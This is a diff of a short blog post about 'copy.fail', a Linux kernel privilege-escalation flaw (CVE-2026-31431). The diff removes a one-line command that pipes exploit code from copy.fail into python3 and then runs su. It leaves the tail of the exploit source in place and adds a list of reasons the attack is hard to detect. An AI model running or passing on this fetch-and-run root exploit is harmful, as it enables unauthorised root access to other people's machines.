@@ -2,18 +2,13 @@
 title: "Copy.fail CVE"
 description: "Second Post. copy.fail linux vulnerability in encryption module"
 date: 2026-05-11
-tags: ["Cybersecurity"]
+tags: ["Cybersecurity", "Linux", "Kernel"]
 ---
 
 ## Thoughts
-I thought this was an absolute *crazy* find. It allows anyone to become root by modifying something in memory, so it is nearly untraceable. You can read more at [copy.fail](copy.fail). Basically anything linux based that was updated between 2017 and 2026 is vulnerable to this.
+I thought this was an absolute *crazy* find. It allows anyone to become root by modifying something in memory, so it is nearly untraceable. You can read more at [copy.fail](https://copy.fail). Basically anything linux based that was updated between 2017 and 2026 is vulnerable to this.
 
-I have not run this before, so idk how well it works. But in case it gets taken down, I'm copying a version here for myself to look at.
-
-## Shortcut to run this exploit 
-```
-curl https://copy.fail/exp | python3 && su
-```
+I have not run this before, so idk how well it works.
 
 ## Source code
 [source](https://github.com/theori-io/copy-fail-CVE-2026-31431/blob/main/copy_fail_exp.py)
@@ -33,3 +28,17 @@ while i<len(e):
  c(f,i,e[i:i+4]);i+=4
 g.system("su")
 ```
+
+## Check your linux kernel version to know if you are affected or not
+```
+uname -r.
+```
+
+## Reasons it's so hard to detect
+  - The file on disk is never touched. Only the kernel's cached copy in memory is.
+  - No write syscall is ever made against the file itself
+  - Permission checks are bypassed entirely. You only need read access to the file
+  - The SUID bit on /usr/bin/su remains valid, so executing the patched in-memory version runs as root
+
+
+
